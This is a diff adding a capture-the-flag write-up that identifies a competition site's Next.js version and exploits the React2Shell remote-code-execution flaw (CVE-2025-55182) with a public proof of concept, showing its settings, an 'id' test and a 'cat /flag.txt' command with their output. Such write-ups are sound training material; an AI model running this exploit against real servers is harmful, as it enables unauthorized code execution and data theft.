@@ -1,0 +1,55 @@
+---
+tags: [web]
+---
+
+# Level 1
+
+---
+
+When provided with a website URL, what do you do first? 
+There are many tasks, right? Scanning the domain, enumerating directories, poking around at functionalities... 
+In a competition, my initial step is to identify the technologies the website is using.
+
+## Analysis
+A convenient and quick method is to use the **Wappalyzer** browser extension. 
+The results reveal that the competition website employs several notable technologies:
+
+- ReactJS
+- NextJS version 16.0.6
+
+<div style={{ width: "40%", margin: "0 auto" }}>
+  <img
+    src={require("./tech.png").default} style={{ width: "100%", height: "auto" }}
+  />
+</div>
+
+In the past year of 2025, one of the most "globally shocking" vulnerabilities has to be [**React2Shell**](https://react2shell.com/), or **CVE-2025-55182**. 
+This CVE boasts a CVSS score of 10.0, a perfect yet terrifying number.
+
+## Exploitation
+Here, I will utilize [this PoC](https://github.com/msanft/CVE-2025-55182//), which only requires modifying two variables, `BASE_URL` and `EXECUTABLE`, during execution.
+```
+BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:100"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
+```
+
+The result when testing the execution of the `id` command returns successfully. 
+Thus, we can confirm the website is affected by React2Shell, opening the door for RCE.
+```
+500
+0:{"a":"$@1","f":"","b":"qTSX0WHwFOlGVW0cqkFAx"}
+1:E{"digest":"uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)"}
+```
+
+Now, it's simply a matter of reading the flag content. 
+Based on the provided source code, I identified the flag file path as `/flag.txt`. 
+I modified the command in the PoC code to `cat /flag.txt`.
+```
+> python .\cve-2025-55182-poc.py
+500
+0:{"a":"$@1","f":"","b":"qTSX0WHwFOlGVW0cqkFAx"}
+1:E{"digest":"SOLIVAQUAANT{this-is-the-flag-of-level-01}"}
+```
+
+And that's how the first flag was exploited-simple, right? 
+I must also give a shout-out to my teammates, who practically predicted the presence of the React2Shell vulnerability in this competition.
